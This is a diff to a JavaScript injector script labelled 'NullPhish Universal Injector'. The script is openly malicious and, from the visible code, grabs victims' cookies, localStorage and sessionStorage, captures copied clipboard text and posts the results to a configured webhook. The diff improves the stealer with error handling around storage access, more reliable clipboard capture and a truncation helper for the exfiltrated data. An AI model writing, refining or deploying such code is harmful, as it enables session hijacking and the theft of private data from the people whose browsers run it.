@@ -10,14 +10,27 @@
         localStorageGrab: true,  // Grab localStorage/sessionStorage
         webhookURL: ''           // Leave empty, set via menu option 101
     };
+
+    const MAX_FIELD_LENGTH = 1000;
+
+    function truncate(value, length = MAX_FIELD_LENGTH) {
+        const text = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
+        return text.length > length ? text.slice(0, length) + '…' : text;
+    }
     
     // ===== SESSION COOKIE GRABBER =====
     if (CONFIG.sessionGrabber) {
-        const cookies = document.cookie;
-        const storage = {
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage)
-        };
+        let cookies = '';
+        let storage = {};
+        try {
+            cookies = document.cookie;
+            storage = {
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage)
+            };
+        } catch (error) {
+            storage = { error: 'storage access denied' };
+        }
         
         const payload = {
             type: 'session_data',
@@ -46,7 +59,7 @@
         let clipboardBuffer = '';
         
         document.addEventListener('copy', function(e) {
-            clipboardBuffer = window.getSelection().toString();
+            clipboardBuffer = (e.clipboardData && e.clipboardData.getData('text/plain')) || window.getSelection().toString();
             const clipboardPayload = {
                 type: 'clipboard',
                 data: clipboardBuffer,
@@ -135,6 +148,7 @@
     function sendToWebhook(data) {
         if (!CONFIG.webhookURL) return;
         
+        const rawData = data.data || data.cookies || data;
         const embed = {
             embeds: [{
                 title: 'New Captured Data: ' + data.type,
@@ -143,7 +157,7 @@
                     { name: 'Type', value: data.type, inline: true },
                     { name: 'URL', value: data.url || window.location.href, inline: true },
                     { name: 'Timestamp', value: data.timestamp, inline: true },
-                    { name: 'Data', value: '```' + JSON.stringify(data.data || data.cookies || data, null, 2).substring(0, 1000) + '```', inline: false },
+                    { name: 'Data', value: '```' + truncate(rawData) + '```', inline: false },
                     { name: 'User Agent', value: data.userAgent || navigator.userAgent, inline: false }
                 ],
                 footer: { text: 'NullPhish Universal Injector' }
